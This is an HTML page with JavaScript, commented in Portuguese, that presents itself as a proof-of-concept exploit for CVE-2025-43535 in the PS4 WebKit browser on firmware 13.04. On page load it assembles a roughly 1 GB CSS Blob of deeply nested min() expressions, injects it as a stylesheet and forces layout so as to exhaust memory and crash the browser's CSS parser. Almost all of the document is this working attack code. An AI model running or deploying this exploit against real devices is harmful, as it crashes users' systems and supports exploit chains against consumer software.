<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 (GitHub Otimizado)</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · Micro Chunk Blob · PS4 FW 13.04</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// Gera apenas até à profundidade 16 (~576 KB de texto)
function buildDepth(depth) {
  let e = '1px';
  for (let d = 1; d <= depth; d++) {
    e = 'min(' + e + ',' + e + ')';
  }
  return e;
}

async function run() {
  L('A preparar o ataque de fragmentação minúscula (Micro Chunk)...', 'info');

  // 1. Gera o bloco c16 (Custo de RAM praticamente zero para o JS)
  L('A gerar bloco c16 (~576 KB)...', 'warn');
  let c16;
  try {
    c16 = buildDepth(16);
    L('Bloco c16 gerado com sucesso. RAM livre!', 'ok');
  } catch(e) {
    L('Falha no c16: ' + e, 'fail');
    return;
  }

  // 2. Monta o Array do Blob com 1856 cópias do c16
  // 1856 * 576 KB = ~1044 MB (Atinge os teus 121.7M de nós)
  L('A compilar o Array de referências (Alvo: 1044MB)...', 'warn');
  
  let chunks = ['.t{width:min('];
  const totalCopies = 1856; 
  
  for(let i = 0; i < totalCopies; i++) {
    chunks.push(c16);
    if (i < totalCopies - 1) {
      chunks.push(',');
    }
  }
  chunks.push(')}');

  // 3. O Navegador cria o ficheiro nativo (Aqui ele usa a RAM libertada do JS)
  L('A instruir o PS4 a construir o ficheiro Blob nativo...', 'info');
  let url;
  let blob;
  try {
    blob = new Blob(chunks, { type: 'text/css' });
    url = URL.createObjectURL(blob);
    L(`Blob criado: ${(blob.size / 1024 / 1024).toFixed(2)} MB ?`, 'ok');
  } catch(e) {
    L('OOM ao criar o Blob: ' + e, 'fail');
    return;
  }

  // Limpa tudo o que ficou no JS para garantir fluxo máximo de rede
  chunks = null;
  c16 = null;

  L('A injetar o CSS gigante no Parser C++ via rede interna...', 'warn');
  
  const el = document.createElement('div');
  el.className = 't';
  document.getElementById('stage').appendChild(el);

  const link = document.createElement('link');
  link.rel = 'stylesheet';
  link.href = url;

  // 4. O Gatilho
  link.onload = () => {
    L('Download para o C++ concluído sem erros de HTTPS!', 'ok');
    L('A forçar o layout para engatilhar as 121 Milhões de instâncias...', 'crash');

    setTimeout(() => {
      try {
        void el.offsetWidth;
        L('Sobreviveu. A RAM suportou a carga.', 'fail');
      } catch(e) {
        L('Erro de layout: ' + e, 'fail');
      }
      
      try { URL.revokeObjectURL(url); } catch(e) {}
    }, 150);
  };

  link.onerror = () => {
    // Se falhar agora, sabemos que o problema não era o tamanho das strings no JS
    L('O WebKit do PS4 bloqueou o carregamento da URL interna.', 'fail');
  };

  document.head.appendChild(link);
}

window.addEventListener('load', () => setTimeout(run, 500));
</script>
</body>
</html>
